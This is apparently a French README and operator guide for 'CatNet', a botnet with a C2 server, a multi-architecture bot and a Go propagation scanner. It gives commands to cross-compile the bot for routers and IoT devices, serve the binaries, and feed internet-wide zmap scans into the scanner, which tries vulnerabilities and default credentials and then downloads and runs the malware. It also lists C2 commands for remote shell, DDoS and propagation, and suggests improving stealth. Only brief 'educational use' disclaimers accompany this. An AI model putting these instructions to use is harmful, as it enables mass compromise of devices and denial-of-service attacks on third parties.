# BOTNET C2 – Guide d'installation et d'utilisation

## 1. Configuration du scanner (fiber.go)

1. **Changer l'adresse IP** dans `fiber.go` pour qu'elle corresponde à votre serveur C2.
2. **Installer les dépendances** :
   ```bash
   sudo apt install golang zmap
   ```
3. **Compiler** :
   ```bash
   go build fiber.go
   ```

## 2. Compilation du malware (bot.c) pour différentes architectures

### Installation des dépendances
```bash
# Installation des compilateurs croisés
sudo apt update
sudo apt install -y gcc-mips-linux-gnu gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu
sudo apt install -y gcc-powerpc-linux-gnu gcc-sh4-linux-gnu gcc-m68k-linux-gnu
sudo apt install -y gcc-sparc64-linux-gnu

# Pour la compilation 32-bit
sudo apt install -y gcc-multilib libc6-dev-i386 linux-libc-dev:i386

# Dépendances supplémentaires pour les headers manquants
sudo apt install -y libc6-dev-mips-cross libc6-dev-arm-cross libc6-dev-arm64-cross
sudo apt install -y libc6-dev-powerpc-cross libc6-dev-sh4-cross libc6-dev-m68k-cross
sudo apt install -y libc6-dev-sparc64-cross

# Correction pour l'erreur asm/socket.h
# Pour x86 32-bit
sudo mkdir -p /usr/i386-linux-gnu/include
sudo ln -s /usr/include/asm-generic /usr/i386-linux-gnu/include/asm
```

### Compilation pour différentes architectures
```bash
# MIPS
mips-linux-gnu-gcc -static -o bot.mips bot.c
# ARM
arm-linux-gnueabi-gcc -static -o bot.arm bot.c
# ARM64
aarch64-linux-gnu-gcc -static -o bot.arm7 bot.c
# x86 (32-bit)
gcc -m32 -static -o bot.x86 bot.c
# x86_64
gcc -static -o bot.x86_64 bot.c
# PowerPC
powerpc-linux-gnu-gcc -static -o bot.ppc bot.c
# SH4
sh4-linux-gnu-gcc -static -o bot.sh4 bot.c
# M68K
m68k-linux-gnu-gcc -static -o bot.m68k bot.c
# SPARC
sparc64-linux-gnu-gcc -static -o bot.sparc bot.c
```

Les binaires générés doivent être placés dans le même dossier que `simple_c2.py` pour être servis par HTTP.

## 3. Lancer le serveur C2 (simple_c2.py)

Dans le dossier du projet :
```bash
python3 simple_c2.py
```
- Le serveur écoute par défaut sur le port 1337 (C2) et 80 (HTTP pour les binaires).
- Une interface CLI permet de piloter les bots : scan, ddos, propagation, etc.

## 4. Utiliser fiber.go (propagation massive)

Compiler l’outil Go :
```bash
go build -o fiber fiber.go
```
```
# Scanner uniquement les plages d'adresses IP spécifiées dans all.lst
sudo bash -c "ulimit -n 999999; ulimit -u999999; zmap -p80 -w all.lst -q | ./fiber 80"


or :  

sudo bash -c "ulimit -n 999999; ulimit -u999999; zmap -p80 -w ips.txt -q | ./fiber 80"

# Si vous avez des problèmes avec zmap, spécifiez l'interface réseau
sudo bash -c "ulimit -n 999999; ulimit -u999999; zmap -p80 -w all.lst -q -i eth0 | ./fiber 80"
# Remplacez eth0 par votre interface réseau (eth0, wlan0, etc.)
```

### Scan générique (alternative)

Si vous préférez scanner des adresses IP aléatoires :

```
# Générer une liste d'adresses IP cibles
sudo zmap -p 80 -o ips.txt -n 100000


Lancer la propagation sur une liste d’IP ou en stdin :
```bash
cat ips.txt | ./fiber 80
```

## 5. Conseils & Dépannage

- Si erreur `asm/socket.h` : vérifie les liens symboliques ci-dessus.
- Si un binaire ne se lance pas sur une cible, recompile avec l’archi exacte et vérifie les permissions (`chmod +x`).
- Pour ajouter des méthodes DDoS ou améliorer la furtivité, modifie `bot.c` (fonction `ddos_attack`).
- Pour voir les bots connectés, utiliser la CLI du C2.

## 6. Sécurité

- N’utilise ce projet que dans un environnement de test ou en laboratoire contrôlé.
- Toute utilisation non autorisée est illégale et à tes risques et périls.

---

# CatNet Botnet

![CatNet Logo](https://img.shields.io/badge/CatNet-Botnet-red)

## Description

CatNet est un botnet modulaire conçu à des fins éducatives et de recherche en sécurité informatique. Il comprend trois composants principaux :

1. **C2 Server (simple_c2.py)** : Serveur de commande et contrôle qui gère les bots infectés
2. **Bot (bot.c)** : Malware qui s'exécute sur les appareils infectés et se connecte au C2
3. **Scanner (fiber.go)** : Outil qui recherche des appareils vulnérables et les infecte avec le bot

> ⚠️ **AVERTISSEMENT** : Ce code est fourni UNIQUEMENT à des fins éducatives et de recherche. L'utilisation de ce code pour attaquer des systèmes sans autorisation explicite est illégale et contraire à l'éthique.

## Installation automatique

Un script d'installation automatique est fourni pour configurer facilement l'ensemble du botnet :

```bash
# Cloner le dépôt
git clone https://github.com/wattsans-dc/botnet-c2-catnet.git
cd botnet-c2-catnet

# Rendre le script d'installation exécutable
chmod +x setup.sh

# Exécuter le script d'installation (nécessite les droits root)
sudo ./setup.sh
```

Le script vous demandera l'adresse IP de votre serveur C2 et configurera automatiquement tous les composants.

## Installation manuelle

Si vous préférez une installation manuelle, suivez ces étapes :

### 1. Installation des dépendances

```bash
# Mise à jour des paquets
sudo apt update

# Installation des outils de base
sudo apt install -y golang zmap screen

# Installation des compilateurs croisés
sudo apt install -y gcc-mips-linux-gnu gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu
sudo apt install -y gcc-powerpc-linux-gnu gcc-sh4-linux-gnu gcc-m68k-linux-gnu
sudo apt install -y gcc-sparc64-linux-gnu

# Pour la compilation 32-bit
sudo apt install -y gcc-multilib libc6-dev-i386 linux-libc-dev:i386

# Dépendances supplémentaires pour les headers manquants
sudo apt install -y libc6-dev-mips-cross libc6-dev-arm-cross libc6-dev-arm64-cross
sudo apt install -y libc6-dev-powerpc-cross libc6-dev-sh4-cross libc6-dev-m68k-cross
sudo apt install -y libc6-dev-sparc64-cross
```

### 2. Correction pour l'erreur asm/socket.h

```bash
# Pour x86 32-bit
sudo mkdir -p /usr/i386-linux-gnu/include
sudo ln -s /usr/include/asm-generic /usr/i386-linux-gnu/include/asm

# Pour les autres architectures
sudo mkdir -p /usr/mips-linux-gnu/include
sudo ln -s /usr/include/asm-generic /usr/mips-linux-gnu/include/asm

sudo mkdir -p /usr/arm-linux-gnueabi/include
sudo ln -s /usr/include/asm-generic /usr/arm-linux-gnueabi/include/asm

sudo mkdir -p /usr/aarch64-linux-gnu/include
sudo ln -s /usr/include/asm-generic /usr/aarch64-linux-gnu/include/asm

sudo mkdir -p /usr/powerpc-linux-gnu/include
sudo ln -s /usr/include/asm-generic /usr/powerpc-linux-gnu/include/asm

sudo mkdir -p /usr/sh4-linux-gnu/include
sudo ln -s /usr/include/asm-generic /usr/sh4-linux-gnu/include/asm

sudo mkdir -p /usr/m68k-linux-gnu/include
sudo ln -s /usr/include/asm-generic /usr/m68k-linux-gnu/include/asm

sudo mkdir -p /usr/sparc64-linux-gnu/include
sudo ln -s /usr/include/asm-generic /usr/sparc64-linux-gnu/include/asm
```

### 3. Configuration des fichiers source

Modifiez les fichiers suivants pour y mettre l'adresse IP de votre serveur C2 :

- Dans **fiber.go** : Modifiez la variable `c2ServerIP`
- Dans **bot.c** : Modifiez la définition `#define C2_SERVER`

### 4. Compilation

#### Compilation du scanner (fiber.go)

```bash
go build -o fiber fiber.go
chmod +x fiber
```

#### Compilation du bot pour différentes architectures

```bash
# MIPS (routeurs courants)
mips-linux-gnu-gcc -static -o bot.mips bot.c -D__MIPS__

# ARM (IoT, routeurs)
arm-linux-gnueabi-gcc -static -o bot.arm bot.c -D__ARM__

# ARM64 (appareils modernes)
aarch64-linux-gnu-gcc -static -o bot.arm7 bot.c -D__ARM__

# x86 (ordinateurs 32-bit)
gcc -m32 -static -o bot.x86 bot.c

# x86_64 (ordinateurs 64-bit)
gcc -static -o bot.x86_64 bot.c

# PowerPC
powerpc-linux-gnu-gcc -static -o bot.ppc bot.c -D__PPC__

# SH4 (anciens appareils embarqués)
sh4-linux-gnu-gcc -static -o bot.sh4 bot.c

# M68K (anciens systèmes)
m68k-linux-gnu-gcc -static -o bot.m68k bot.c

# SPARC (serveurs)
sparc64-linux-gnu-gcc -static -o bot.sparc bot.c -D__SPARC__
```

## Utilisation

### Démarrage du serveur C2

```bash
# Démarrer le serveur C2 en arrière-plan avec screen
screen -dmS c2_server python3 simple_c2.py

# Pour se connecter à la session screen
screen -r c2_server
```

### Démarrage du scanner

```bash
# Démarrer le scanner sur le port 80 en arrière-plan avec screen
screen -dmS scanner_80 ./fiber 80

# Pour se connecter à la session screen
screen -r scanner_80
```

### Alimentation du scanner

Le scanner attend des adresses IP sur l'entrée standard. Vous pouvez utiliser zmap pour générer des cibles :

```bash
# Scanner le port 80 sur Internet et envoyer les résultats au scanner
zmap -p 80 | ./fiber 80

# Ou pour un scan plus ciblé
zmap -p 80 -n 10000 | ./fiber 80
```

## Commandes du serveur C2

Une fois connecté à la session screen du serveur C2, vous pouvez utiliser les commandes suivantes :

- `list` - Liste les bots connectés
- `info <id>` - Affiche les informations détaillées d'un bot
- `cmd <id> <commande>` - Exécute une commande shell sur un bot spécifique
- `broadcast <commande>` - Exécute une commande sur tous les bots
- `ddos <id> <cible:port> <durée>` - Lance une attaque DDoS depuis un bot
- `ddos-all <cible:port> <durée>` - Lance une attaque DDoS depuis tous les bots
- `scan <id> <sous-réseau>` - Scanne un sous-réseau depuis un bot
- `propagate <id> <cible>` - Propage le bot à une nouvelle cible
- `ping <id>` - Vérifie si un bot est toujours actif
- `ping-all` - Vérifie tous les bots
- `kill <id>` - Déconnecte un bot
- `exit` - Quitte le serveur

## Architecture du botnet

### Serveur C2 (simple_c2.py)

Le serveur C2 opère sur deux ports :
- **Port 1337** : Communication avec les bots infectés
- **Port 80** : Serveur HTTP pour distribuer les binaires du malware

### Bot (bot.c)

Le bot inclut les fonctionnalités suivantes :
- Connexion au serveur C2
- Exécution de commandes shell
- Attaques DDoS (plusieurs méthodes)
- Auto-propagation
- Persistance sur le système infecté

### Scanner (fiber.go)

Le scanner recherche des appareils vulnérables et tente de les infecter en :
- Testant les vulnérabilités connues
- Essayant des combinaisons d'identifiants courantes
- Téléchargeant et exécutant le malware approprié pour l'architecture cible

## Dépannage

### Problèmes de compilation

- **Erreur asm/socket.h** : Vérifiez que vous avez créé les liens symboliques comme indiqué dans la section d'installation
- **Erreurs de compilation croisée** : Assurez-vous que tous les compilateurs croisés sont installés

### Problèmes de connexion

- **Les bots ne se connectent pas** : Vérifiez que le port 1337 est ouvert dans votre pare-feu
- **Téléchargements mais pas de connexions** : Vérifiez que les binaires ont les permissions d'exécution correctes

## Licence

Ce projet est fourni à des fins éducatives uniquement. L'utilisation de ce code pour des activités illégales est strictement interdite.
